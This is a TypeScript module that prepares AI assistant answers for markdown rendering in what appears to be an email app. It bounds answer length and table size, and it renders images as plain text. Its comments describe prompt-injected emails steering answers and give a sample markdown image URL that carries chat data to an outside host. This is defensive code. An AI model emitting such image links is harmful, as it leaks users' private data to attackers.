import { createElement } from 'react'
import { defaultUrlTransform, type Components } from 'react-markdown'
import remarkGfm from 'remark-gfm'
import { normalizeMailrefs } from './normalizeMailrefs'

/**
 * How an assistant answer becomes markdown. ONE module for everything about it, used by the component that draws the
 * answer (`AiAnswerMarkdown`) and by the one that lists the citation tickets of it (`answerCitations`), so the two can
 * never disagree about what the answer contains.
 *
 * ONE bound, on length. The chat request sets no output cap of its own, so the most a single answer can be is the
 * largest per-response output of the models the app talks to: 128 000 tokens (the biggest `maxOutputTokens` in
 * `@ai-sdk/anthropic`'s model table; an OpenAI-compatible endpoint is not capped by us either, and a self-hosted model
 * could in theory exceed it). At about 4 characters per token that is 512 000 characters; the bound is 600 000, with
 * room. A real answer is nowhere near it, so every ordinary answer, however long, is drawn in full, with its
 * formatting and links. Above the bound the answer is shown as plain text (no markdown, no
 * links, no tickets), which no real model response can reach.
 *
 * There is deliberately NO bound on the input by construct (marks, lines, nesting, runs of characters). They were built and
 * reviewed (five rounds) and each one only estimated the cost of a third-party parser from counts of characters; every
 * round found a new shape the counts missed, and they cut off real long answers. The named residual instead: an answer
 * built on purpose (a prompt-injected email can steer it) can make the parser take several seconds, about 3 s measured
 * for 78 kB of list markers on every line, and the panel hangs for that long. Nothing leaks, and a parser FAILURE (the
 * stack overflowing on 1 000 to 3 000 nested `>`, depending on the runtime) is caught by the error boundary around each
 * answer, which shows that answer as plain text. A hard limit on the time would need the parse in a Worker with a
 * deadline.
 *
 * The one thing bounded beyond length is the OUTPUT of a table (`boundTables`, below): the memory it takes is a property
 * of the tree we own, so the bound is exact, not an estimate.
 */
export const ANSWER_MAX_CHARS = 600_000

export type PreparedAnswer =
  | { kind: 'markdown'; text: string }
  | { kind: 'plain'; text: string }

/** The answer as the markdown pipeline should get it (links normalised), or as plain text when it is beyond the bound. */
export function prepareAnswerMarkdown(text: string): PreparedAnswer {
  if (typeof text !== 'string') return { kind: 'plain', text: '' }
  if (text.length > ANSWER_MAX_CHARS) return { kind: 'plain', text }
  return { kind: 'markdown', text: normalizeMailrefs(text) }
}

/**
 * A markdown image is fetched by the browser the moment it is drawn, with no click: a prompt-injected answer can carry
 * data out in the URL (`![](https://host/?d=<chat data>)`). Images from an answer are NEVER loaded: they are drawn as
 * text (the alt text and the address), a plain text node with no attribute that names the address. An ordinary link
 * stays a link and opens only on a click, through the existing path for external links.
 */
const BlockedImage: NonNullable<Components['img']> = ({ alt, src }) =>
  createElement('span', { className: 'ai-blocked-image' }, [alt, src ? `(${src})` : ''].filter(Boolean).join(' '))

/** `mailref://` links reach the renderer untouched (the panel judges them); every other URL goes through the default filter. */
export const answerUrlTransform = (url: string): string => (url.startsWith('mailref://') ? url : defaultUrlTransform(url))

/**
 * GFM pads every row of a table to the width of its header, so the OUTPUT is columns × rows, which no count of the input
 * sees: a header of 1 400 columns and thousands of pipe-less rows builds a tree of 1.8 GB from 18 kB (measured in Node).
 * Unlike the counts of the input that were dropped, this is an exact bound on the tree we own, not an estimate of a
 * parser's cost: a remark plugin after `remark-gfm` adds up the cells all the tables of the answer will have (columns ×
 * rows) BEFORE the padding happens (in remark-rehype) and throws above the budget; the answer is then shown as plain text
 * (the error boundary when drawing, the catch when listing tickets). A real table is a few hundred cells.
 */
export const ANSWER_MAX_TABLE_CELLS = 5_000

interface MdNode { type?: string; align?: unknown[]; children?: MdNode[] }
export function boundTables() {
  return (tree: MdNode): void => {
    let cells = 0
    const stack: MdNode[] = [tree]
    while (stack.length > 0) {
      const node = stack.pop()!
      if (node.type === 'table') {
        cells += (node.align?.length ?? 0) * (node.children?.length ?? 0)
        if (cells > ANSWER_MAX_TABLE_CELLS) throw new Error('answer tables too large')
      }
      if (node.children) for (const child of node.children) stack.push(child)
    }
  }
}

/** The ONE set of markdown settings of an answer: the drawing component adds its own link renderer, extraction its capture. */
export const answerMarkdownProps = {
  remarkPlugins: [remarkGfm, boundTables],
  urlTransform: answerUrlTransform,
  components: { img: BlockedImage } satisfies Components,
}
